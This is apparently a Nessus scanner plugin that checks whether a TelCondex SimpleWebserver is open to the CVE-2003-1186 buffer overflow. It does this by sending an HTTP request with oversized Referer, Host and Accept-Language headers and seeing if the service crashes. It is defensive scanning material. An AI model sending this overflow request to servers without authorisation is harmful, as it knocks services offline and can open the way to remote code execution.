include("compat.inc");

if(description) 
{ 
	script_id(11927); 
	script_cve_id("CVE-2003-1186");
	script_bugtraq_id(8925);
	script_osvdb_id(2738, 57530);
        script_version("$Revision: 1.18 $"); 
      
	name["english"] = "TelCondex Simple Webserver Buffer Overflow"; 
        
      script_name(english:name["english"]); 

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote web server has a buffer overflow vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote TelCondex SimpleWebserver is vulnerable to a remote
executable buffer overflow, due to missing length check on the
referer-variable of the HTTP-header.  A remote attacker could exploit
this to crash the web server, or potentially execute arbitrary code."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?af2bb0e4"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to version 2.13 or later."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/11/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/10/30");
 script_cvs_date("$Date: 2011/03/11 21:52:40 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

      summary["english"] = "Checks for TelCondex Buffer Overflow";
	script_summary(english:summary["english"]);
	script_category(ACT_DENIAL);
# Conversion to new API by Tenable Network Security, Inc.
	script_copyright(english:"This script is Copyright (C) 2003-2011 Matt North");

	family["english"] = "Web Servers";
	script_family(english:family["english"]);
	
	script_dependencie("http_version.nasl");
	script_require_ports("Services/www", 80);
	script_require_keys("Settings/ParanoidReport");
	exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http_func.inc");

port = get_http_port(default:80);
if(http_is_dead(port:port)) exit(0);


s =
 'GET / HTTP/1.1\r\n' +
 'Accept: */* \r\n' +
 'Referer:' + crap(704) +'\r\n' +
 'Host:' + crap(704) + '\r\n' +
 'Accept-Language' + crap(704) + '\r\n\r\n' ;

soc =  http_open_socket(port);
if(!soc) exit(1);

send(socket: soc, data: s);
r = http_recv(socket: soc);
http_close_socket(soc);

if (service_is_dead(port: port, exit: 0) > 0)
{
  security_hole(port);
  exit(0);
}

if (report_paranoia < 2) exit(0);

if (http_is_dead(port: port, retry: 3))
	security_hole(port);
